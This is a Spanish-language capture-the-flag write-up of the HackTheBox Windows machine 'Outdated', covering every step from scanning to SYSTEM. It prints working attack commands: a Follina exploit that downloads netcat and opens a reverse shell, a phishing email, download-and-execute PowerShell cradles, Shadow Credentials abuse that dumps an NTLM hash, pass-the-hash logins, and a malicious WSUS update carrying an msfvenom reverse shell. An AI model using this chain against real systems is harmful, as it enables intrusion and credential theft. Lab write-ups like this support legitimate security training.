# Máquina "Outdated" de HackTheBox

## Características

- **Sistema Operativo**: Windows
- **Dificultad**: Media
- **Técnicas utilizadas**:
  - SMB Enumeration
  - Follina Exploitation (CVE-2022-30190) + Nishang PowerShell TCP Shell [Remote Code Execution]
  - SharpHound + BloodHound DC Enumeration
  - Abusing AddKeyCredentialLink Privilege [Invoke-Whisker.ps1 - Shadow Credentials]
  - Getting the user's NTLM Hash with Rubeus
  - Abusing WinRM - EvilWinRM
  - Abusing WSUS Administrator Group
  - WSUS Exploitation - Creating a malicious patch for deployment [Privilege Escalation]

## Utilidad

Esta máquina es útil para:
- OSCP
- OSEP
- Active Directory

## Reconocimiento

**IP**: 10.10.11.175

### Escaneo de puertos

```bash
nmap -p- --min-rate 10000 10.10.11.175
```

```
PORT      STATE    SERVICE
25/tcp    open     smtp
53/tcp    open     domain
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
143/tcp   open     imap
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
587/tcp   open     submission
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
2179/tcp  open     vmrdp
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5985/tcp  open     wsman
8530/tcp  open     unknown
8531/tcp  open     unknown
9389/tcp  open     adws
23088/tcp filtered unknown
26319/tcp filtered unknown
34206/tcp filtered unknown
43966/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
49671/tcp open     unknown
49674/tcp open     unknown
49762/tcp filtered unknown
49890/tcp open     unknown
49919/tcp open     unknown
49932/tcp open     unknown
49936/tcp open     unknown
54471/tcp filtered unknown
```

### Escaneo detallado

```bash
nmap -p 25,53,88,135,139,143,389,445,464,587,593,636,2179,3268,3269,5985,8530,8531,9389 -sCV 10.10.11.175
```

```
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-22 07:00:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  tcpwrapped
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:39+00:00; +8h20m04s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:38+00:00; +8h20m03s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:40+00:00; +8h20m04s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:38+00:00; +8h20m03s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
8531/tcp open  unknown
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/21%Time=62D9D5F2%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h20m03s, deviation: 0s, median: 8h20m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-22T07:03:10
|_  start_date: N/A
```

La máquina parece ser un Controlador de Dominio con varios dominios. Agregamos los dominios a nuestro `/etc/hosts`.

## Enumeración SMB

Con el siguiente script, verificamos los permisos de acceso SMB:

```bash
kali@kali:~/Documents/HTB/Outdated$ ~/Documents/Scripts/checkSMBPermissions.sh 'anonymous' '' 10.10.11.175

Checking share: 'ADMIN$'
Checking share: 'C$'
Checking share: 'NETLOGON'
Checking share: 'Shares'
  - anonymous has read access
Checking share: 'SYSVOL'
Checking share: 'UpdateServicesPackages'
Checking share: 'WsusContent'
Checking share: 'WSUSTemp'
```

Dentro del recurso compartido "Shares", encontramos un archivo PDF:

```bash
kali@kali:~/Documents/HTB/Outdated$ smbclient -N //10.10.11.175/Shares

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 20 11:01:33 2022
  ..                                  D        0  Mon Jun 20 11:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022

                9116415 blocks of size 4096. 2150420 blocks available
```

## Análisis del PDF

![Contenido del PDF](/secciones/posts/imagenes/outdated/pdf1.png)

El PDF contiene información sobre el envío de enlaces al soporte de TI para monitorear plataformas internas. Menciona CVEs que deben ser parcheados, incluyendo CVE-2022-30190 (también conocido como Follina), que utiliza enlaces externos de Word para llamar a la herramienta de diagnóstico de soporte de Microsoft (MSDT) y realizar ejecución de código.

## Explotación: Follina (CVE-2022-30190)

Utilizamos el script de John Hammond para explotar esta vulnerabilidad, modificándolo para que apunte a nuestra máquina:

```python
[...]
    if args.reverse:
        command = f"""Invoke-WebRequest http://10.10.14.130/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
        os.system("cp nc64.exe "+serve_path)
[...]
    if args.reverse:
        t = threading.Thread(target=serve_http, args=())
        t.start()
        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
        os.system(f"rlwrap nc -lnvp {args.reverse}")
```

Ejecutamos el script:

```bash
kali@kali:~/Documents/HTB/Outdated/msdt-follina$ python3 follina.py --interface tun0 --port 80 --reverse 443
[+] copied staging doc /tmp/wt3ylf2c
[+] created maldoc ./follina.doc
[+] serving html payload on :80
[+] starting 'nc -lvnp 443' 
listening on [any] 443 ...
```

Enviamos un correo electrónico con el enlace malicioso:

```bash
kali@kali:~/Documents/HTB/Outdated/msdt-follina$ swaks --to itsupport@outdated.htb --from marmeus@marmeus.com --server mail.outdated.htb --body "http://<ATTACKER_IP>/"
```

Obtenemos una shell reversa como el usuario `btables`.

## Escalada de Privilegios

### Enumeración con SharpHound

Utilizamos SharpHound para recopilar datos del dominio:

```powershell
C:\Users\btables\AppData\Local\Temp\SDIAG_20ab2273-6de8-4357-963b-cf3b570e74af> powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>:8080/SharpHound.ps1'); Invoke-Bloodhound -CollectionMethod All -ZipFileName loot.zip"
```

Configuramos un servidor SMB para transferir archivos:

```bash
kali@kali:~/Documents/HTB/Outdated$ smbserver.py -smb2support a .
```

Copiamos los datos recopilados:

```cmd
C:\Users\btables\AppData\Local\Temp\SDIAG_20ab2273-6de8-4357-963b-cf3b570e74af> copy 20220912201007_loot.zip \\10.10.14.130\a\
```

### Análisis con BloodHound

Usando BloodHound con la opción pathfinding, encontramos una ruta que nos permite convertirnos en el usuario "sflowers":

![Análisis de BloodHound](/secciones/posts/imagenes/outdated/sharp1.png)

### Shadow Credentials

Podemos explotar esto usando la técnica de "Shadow Credentials" (https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials), que requiere Whisker:

```bash
curl -s https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Whisker.ps1 | grep FromBAsE64String | cut -d '"' -f 2 | base64 -d > Whisker.gz
gunzip Whisker.gz
mv Whisker Whisker.exe
```

### Obteniendo acceso como sflowers

```powershell
# Subir binarios
C:\Users\btables\AppData\Local\Temp\SDIAG_80424d7e-875a-4f69-ae89-1166ec1effd9> powershell.exe Invoke-WebRequest -Uri "http://10.10.14.130/Whisker.exe" -OutFile Whisker.exe

# Agregar nueva credencial shadow a sflowers
C:\Users\btables\AppData\Local\Temp\SDIAG_80424d7e-875a-4f69-ae89-1166ec1effd9> Whisker.exe add /target:sflowers

[...]
Rubeus.exe asktgt /user:sflowers /certificate:"<BASE64_CERTIFICATE>" /password:"<PASSWORD>" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

# Ejecutar el comando generado de Rubeus para obtener el hash NTLM de sflowers
C:\Users\btables\AppData\Local\Temp\SDIAG_80424d7e-875a-4f69-ae89-1166ec1effd9> 

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

Usamos evil-winrm para conectarnos como sflowers:

```bash
kali@kali:~/Documents/HTB/Outdated$ evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5

[...]
*Evil-WinRM* PS C:\Users\sflowers\Documents> type ../Desktop/user.txt
[CENSORED]
```

Obtenemos la flag de usuario.

### Escalada a Administrator

Ejecutamos WinPEAS y descubrimos la técnica de escalada de privilegios WSUS:

```powershell
*Evil-WinRM* PS C:\Users\sflowers\Documents> powershell.exe Invoke-WebRequest -Uri "http://<ATTACKER_IP>/winPEASx64.exe" -OutFile winPEASx64.exe
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\winPEASx64.exe
[...]
╔══════════╣ Checking WSUS                  
╚  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    WSUS is using http: http://wsus.outdated.htb:8530
╚ You can test https://github.com/pimps/wsuxploit to escalate privileges
    And UseWUServer is equals to 1, so it is vulnerable! 
```

### Explotación WSUS

Utilizamos SharpWSUS para explotar WSUS:

```bash
curl -s https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1 | grep FromBAsE64String | cut -d '"' -f 2 | base64 -d > SharpWSUS.gz
gunzip SharpWSUS.gz
mv SharpWSUS SharpWSUS.exe

wget https://download.sysinternals.com/files/PSTools.zip
unzip PSTools.zip

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe
```

Transferimos los archivos a la víctima:

```powershell
*Evil-WinRM* PS C:\Users\sflowers\Documents> powershell.exe Invoke-WebRequest -Uri "http://<ATTACKER_IP>/SharpWSUS.exe" -OutFile SharpWSUS.exe
*Evil-WinRM* PS C:\Users\sflowers\Documents> powershell.exe Invoke-WebRequest -Uri "http://<ATTACKER_IP>/PsExec64.exe" -OutFile PsExec64.exe
*Evil-WinRM* PS C:\Users\sflowers\Documents> powershell.exe Invoke-WebRequest -Uri "http://<ATTACKER_IP>/shell.exe" -OutFile shell.exe
```

Localizamos el servidor WSUS:

```powershell
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\SharpWSUS.exe locate

[...]

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.outdated.htb:8530

[*] Locate complete
```

Inspeccionamos el servidor:

```powershell
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\SharpWSUS.exe inspect

[...]

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.outdated.htb, dead:beef::242, 10.0.17763.1432, 9/13/2022 3:53:49 AM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```

Creamos la actualización maliciosa:

```powershell
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Documents\PsExec64.exe" /args:"-accepteula -s -d C:\Users\sflowers\Documents\shell.exe" /title:"Marmeus update"

[...]

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:2c71c2a6-c08b-4f2c-9da8-423588eac658 /computername:Target.FQDN /groupname:"Group Name"
                                                    
[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:2c71c2a6-c08b-4f2c-9da8-423588eac658 /computername:Target.FQDN
                                                                                                         
[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:2c71c2a6-c08b-4f2c-9da8-423588eac658 /computername:Target.FQDN /groupname:"Group Name"
```

Aprobamos la actualización:

```powershell
.\SharpWSUS.exe approve /updateid:<UPDATE_ID> /computername:dc.outdated.htb /groupname:"Marmeus group" 
```

Recibimos la shell como SYSTEM:

```bash
kali@kali:~/Documents/HTB/Outdated$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.11.175] 65231
Microsoft Windows [Version 10.0.17763.1432]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
[CENSORED]
```

¡Hemos obtenido acceso como SYSTEM!

## Notas

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto se debe a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla. Por eso he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.